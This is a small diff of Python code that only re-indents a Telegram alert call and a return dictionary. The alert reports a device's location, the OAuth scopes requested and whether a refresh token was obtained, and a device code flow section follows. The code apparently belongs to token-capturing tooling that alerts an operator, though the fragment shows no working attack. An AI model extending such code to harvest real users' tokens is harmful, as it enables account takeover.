@@ -1055,21 +1055,21 @@ send_telegram_alert(
     f"Location: {device_info.get('location', 'unknown')}\n"
     f"Scopes Requested: {requested_scopes[:80]}...\n"
     f"Has Refresh Token: {bool(result.get('refresh_token'))}"
-)
+    )
 
-return {
-    "resolved_user_id": resolved_user_id,
-    "effective_user_id": effective_user_id,
-    "job_title": job_title,
-    "profile": profile,
-    "admin_user_id": admin_user_id_for_saved_user,
-    "flow_type": flow_type,
-    "payload_source": payload_source,
-    "scopes_requested": requested_scopes,
-    "relay": relay or "direct",
-    "relay_host": relay_host or None,
-    "redirect_uri_used": token_exchange_redirect_uri,
-}
+    return {
+        "resolved_user_id": resolved_user_id,
+        "effective_user_id": effective_user_id,
+        "job_title": job_title,
+        "profile": profile,
+        "admin_user_id": admin_user_id_for_saved_user,
+        "flow_type": flow_type,
+        "payload_source": payload_source,
+        "scopes_requested": requested_scopes,
+        "relay": relay or "direct",
+        "relay_host": relay_host or None,
+        "redirect_uri_used": token_exchange_redirect_uri,
+    }
 
 # =========================
 # DEVICE CODE FLOW
